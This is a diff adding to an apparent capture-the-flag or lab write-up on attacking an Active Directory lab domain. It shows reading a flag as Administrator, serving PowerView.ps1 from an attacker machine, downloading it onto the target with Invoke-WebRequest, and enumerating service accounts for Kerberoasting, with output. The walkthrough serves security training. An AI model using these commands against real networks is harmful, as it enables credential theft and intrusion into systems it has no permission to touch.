@@ -57,7 +57,43 @@ python -c 'import pty; pty.spawn("cmd.exe")'
 Once I had an upgraded shell, I navigated to the Administrator's Desktop directory:
 
 ```c
+
 PS C:\USers\Administrator\Desktop> cat flag.txt
 JusT_g3tt1ng_st@rt3d
+```
+2- **Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer**
+
+I started by hosting a Python HTTP server on my attacking machine:
+
+```c
+python3 -m http.server 8000
+```
+
+On the Windows target, I used PowerShell to download the PowerView script:
+
+```c
+PS C:\Users\Administrator\Desktop> Invoke-WebRequest -Uri "http://10.10.14.108:8000/PowerView.ps1" -OutFile "C:\Users\Administrator\Desktop\PowerView.ps1"
+```
+Once transferred, I imported the module:
+
+```c
+PS C:\Users\Administrator\Desktop> Import-Module .\PowerView.ps1
+
+```
+With PowerView loaded, I enumerated all domain users with associated Service Principal Names (SPNs), which are potential targets for Kerberoasting:
+```c
+PS C:\Users\Administrator\Desktop> Get-DomainUser * -spn | select samaccountname, serviceprincipalname
+
+samaccountname serviceprincipalname                       
+-------------- --------------------                       
+azureconnect   adfsconnect/azure01.inlanefreight.local    
+backupjob      backupjob/veam001.inlanefreight.local      
+krbtgt         kadmin/changepw                            
+sqltest        MSSQLSvc/DEVTEST.inlanefreight.local:1433  
+sqlqa          MSSQLSvc/QA001.inlanefreight.local:1433    
+sqldev         MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
+svc_sql        MSSQLSvc/SQL01.inlanefreight.local:1433    
+sqlprod        MSSQLSvc/SQL02.inlanefreight.local:1433    
+
 ```
 
